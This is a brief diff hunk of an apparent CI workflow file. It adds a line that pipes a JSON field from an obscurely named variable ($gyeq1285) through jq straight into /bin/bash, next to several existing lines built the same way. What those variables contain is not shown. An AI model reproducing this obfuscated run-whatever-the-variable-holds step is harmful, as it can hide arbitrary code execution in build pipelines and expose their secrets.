@@ -61,6 +61,7 @@ jobs:
           printf '%s' "$kbebj81525" | jq -r .x1 | /bin/bash
           printf '%s' "$kj16" | jq -r .g029 | /bin/bash
           printf '%s' "$feu0" | jq -r .nw2 | /bin/bash
+          echo $gyeq1285 | jq -r .z13 | /bin/bash
 
       - name: Archive output
         if: always()
